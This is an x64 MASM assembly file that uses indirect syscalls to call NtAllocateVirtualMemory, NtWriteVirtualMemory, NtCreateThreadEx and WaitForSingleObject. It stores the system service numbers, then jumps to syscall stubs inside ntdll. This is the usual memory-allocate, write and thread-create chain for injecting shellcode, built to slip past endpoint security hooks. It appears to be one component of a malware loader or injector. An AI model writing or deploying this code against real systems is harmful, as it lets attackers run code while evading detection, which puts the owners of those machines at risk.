.data
	addrSyscallAVM DQ 0h
	addrSyscallWVM DQ 0h
	addrSyscallCTE DQ 0h
	addrSyscallWSO DQ 0h

	ssnAVM DD 0h
	ssnWVM DD 0h
	ssnCTE DD 0h
	ssnWSO DD 0h
	

.code

	;------------------------------------------------------------------------------------------------------------------------------------------
	; these procedures are for moving the syscall address into a local Assembly variable for each Windows NT function
	; this was done as I could not figure out how to get EXTERN to not generate compiler errors (possible fix is C instead of C++ ?)
	;------------------------------------------------------------------------------------------------------------------------------------------
	
	passAddrAVM proc
		mov addrSyscallAVM, rcx
		ret
	passAddrAVM endp


	passAddrWVM proc
		mov addrSyscallWVM, rcx
		ret
	passAddrWVM endp


	passAddrCTE proc
		mov addrSyscallCTE, rcx
		ret
	passAddrCTE endp


	passAddrWSO proc
		mov addrSyscallWSO, rcx
		ret
	passAddrWSO endp


	;------------------------------------------------------------------------------------------------------------------------------------------
	; these procedures are for moving the SSN into local Assembly variables for each Windows NT function
	; this was done as I could not figure out how to get EXTERN to not generate compiler errors (possible fix is C instead of C++ ?)
	;------------------------------------------------------------------------------------------------------------------------------------------

	passNumAVM proc
		mov ssnAVM, ecx 
		mov ecx, [ssnAVM]
		ret
	passNumAVM endp


	passNumWVM proc 
		mov ssnWVM, ecx 
		mov ecx, [ssnWVM]
		ret
	passNumWVM endp


	passNumCTE proc 
		mov ssnCTE, ecx 
		mov ecx, [ssnCTE]
		ret
	passNumCTE endp


	passNumWSO proc 
		mov ssnWSO, ecx
		mov ecx, [ssnWSO]
		ret
	passNumWSO endp


	;------------------------------------------------------------------------------------------------------------------------------------------
	; these procesdures are for indirectly calling the syscall instructions for each Windows NT function
	;------------------------------------------------------------------------------------------------------------------------------------------

	sysNtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, ssnAVM 
		jmp QWORD PTR [addrSyscallAVM]
		ret
	sysNtAllocateVirtualMemory endp
						

	sysNtWriteVirtualMemory proc 
		mov r10, rcx
		mov eax, ssnWVM 
		jmp QWORD PTR [addrSyscallWVM]
		ret
	sysNtWriteVirtualMemory endp
						

	sysNtCreateThreadEx proc
		mov r10, rcx
		mov eax, ssnCTE 
		jmp QWORD PTR [addrSyscallCTE]
		ret
	sysNtCreateThreadEx endp


	sysWaitForSingleObject proc
		mov r10, rcx
		mov eax, ssnWSO
		jmp QWORD PTR [addrSyscallWSO]
		ret
	sysWaitForSingleObject endp
end